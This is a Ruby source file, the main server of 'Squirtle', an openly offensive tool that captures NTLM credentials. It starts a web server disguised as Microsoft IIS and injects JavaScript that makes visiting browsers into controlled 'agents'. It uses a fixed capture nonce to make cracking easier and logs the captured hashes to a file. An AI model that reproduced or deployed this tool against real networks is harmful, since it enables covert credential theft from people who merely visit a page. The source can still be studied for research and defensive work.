#!/usr/bin/env ruby
#
# Squirtle - Controlling The NTLM Single SignOn process.
#
# Copyright (C) 2008  Kurt Grutzmacher
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

require 'webrick'
include WEBrick
require 'net/http'
require 'digest/md5'
require 'uri'
require 'yaml'
require 'base64'

require 'rubygems'
require 'json'
require 'sq_ntlmfuncs'
require 'sq_db'
require 'sq_controller'
require 'sq_victim'

# All requests to / get the controller code to become agents of Squirtle!
class DefaultServlet < HTTPServlet::AbstractServlet
	def do_GET(req, resp)
		resp.keep_alive = false
		resp.status = 200
		resp.body = $config["index"]
		resp['Content-Type'] = "text/html"
		key = getsessionkey(req)
		resp['Set-Cookie'] = "key=#{key}; path=/; Max-Age=10080"
	end
	alias do_POST do_GET
end

# Load the YAML configuration file and define global variables.
def loadconfig

	$config = YAML.load_file("squirtle.yaml")

	if $config["domain"] == nil then
		$config['domain'] = "DOMAIN"
	end
	
	if $config["server"] == nil then
		$config['server'] = "SERVER"
	end

	if $config["dns_domain"] == nil then
	  $config['dns_domain'] = "example.com"
	end

	$config['dns_name'] = "#{$config['server'].downcase}.#{$config['dns_domain']}"
		
	if $config["nonce"] == nil then
		$config['nonce'] = "\x11\x22\x33\x44\x55\x66\x77\x88"
	else
		$config['nonce'] = $config['nonce'].to_s.to_a.pack('h*')
	end
	
	if $config["address"] == nil then
		$config['address'] = "0.0.0.0"
	end
	
	if $config["port"] == nil then
		$config['port'] = 8080
	end

	if $config["serverstring"] == nil then
		$config['serverstring'] = "Microsoft-IIS/5.0"
	end

	if $config["output-file"] == nil then
		$config['output-file'] = "ntlmhashes.txt"
	end

	if $config["db"] == nil then
		$config['db'] = "sqlite://squirtle.db"
	end
	
	if $config['user'] == nil then
		$config['user'] = "squirtle"
	end
	
	# if no password, generate a random password
	if $config['pass'] == nil then
		chars = ("a".."z").to_a + ("A".."Z").to_a + ("0".."9").to_a
		$config['pass'] = Array.new(8, '').collect{chars[rand(chars.size)]}.join
	end
	
	# timeout for clients
	if $config["timeout"] == nil then
		$config["timeout"] = 5000
	end
	
	# load main squirtle.html file into index variable
	if $config["indexfile"] == nil then
		$config["indexfile"] = "squirtle.html"
	end
	tmparray = IO.readlines($config["indexfile"])
	$config["index"] = tmparray.to_s
	
	# load main squirtle.js file and replace timeout value
	if $config["jsfile"] == nil then
		$config["jsfile"] = "squirtle.js"
	end
	tmparray = IO.readlines($config["jsfile"])
	$config["js"] = tmparray.to_s

	$config["js"] = $config["js"].gsub("TIMEOUTVALUE", $config["timeout"].to_s)

	$config["index"] = $config["index"].gsub("INSERTSCRIPTHERE", $config["js"])
	
	puts "Configuration loaded . . ."
	puts "-" * 70
	puts "  Listen Addr: #{$config['address']}:#{$config['port']}"
	puts "  Output File: #{$config['output-file']}"
	puts "Database Info: #{$config['db']}"
	puts "  Server Type: #{$config['serverstring']}"
	puts "       Domain: #{$config['domain']}"
	puts "       Server: #{$config['server']}"
	puts "     DNS Name: #{$config['dns_name']}"
	puts "   DNS Domain: #{$config['dns_domain']}"
	puts "Capture Nonce: #{$config['nonce'].unpack('h*')}"
	puts "-" * 70

end

# Pull the session key from HTTP Cookie. If no key within the session
# make a temporary key. If no request, return undefined.
def getsessionkey(req)
	if req == nil
		return "undefined"
	end

	session_key = req.cookies.detect{|c| c.name == "key"}
	if session_key then
		return session_key.to_s.sub!("key=", "")
	else
		return Digest::MD5.hexdigest(req.peeraddr[3] + req['User-Agent'] + srand.to_s + Time.now.to_s)
	end
end
	
# --------------------------------------------------------------------------
# Squirtle, Squirtle, Squirtle!
puts "Squirtle v1.1 (c) 2008 by Kurt Grutzmacher - grutz@jingojango.net\n\n"

$config = {}

loadconfig
db = DB.new()
db.setup($config['db'])
db.connect($config['dbopts'])

# start 'er up
# gotta seed
srand

server_logger = Log.new($stderr, Log::WARN)
#server_logger = Log.new($stderr, Log::DEBUG)
if $config["accesslog"]
	log_stream = File.open($config["accesslog"], "w")
else
	log_stream = File.open($sterr, "w")
end
access_log = [ [ log_stream, AccessLog::COMBINED_LOG_FORMAT ] ]

webserver = HTTPServer.new( :BindAddress => $config['address'],
                            :Port => $config['port'],
                            :ServerSoftware => $config['serverstring'],
                            :Logger => server_logger, 
                            :Access_Log => access_log
                          )

['INT', 'TERM'].each { |signal|
	trap(signal){
		puts "[*] Squirtle shutting down. . ."
		db.disconnect
		webserver.shutdown
	} 
}

webserver.mount('/keepalive', KeepAliveServlet)
webserver.mount('/client/auth', AuthorizationServlet)
webserver.mount('/controller', ControllerServlet)
webserver.mount('/static', HTTPServlet::FileHandler, Dir::pwd + '/staticdata')
webserver.mount('/', DefaultServlet)
webserver.mount_proc("/favicon.ico") {|req,res| res.status = 404}	# ignore favicons 

print "\nSquirtle Started ---> Controller credentials: #{$config['user']}:#{$config['pass']}\n\n"

webserver.start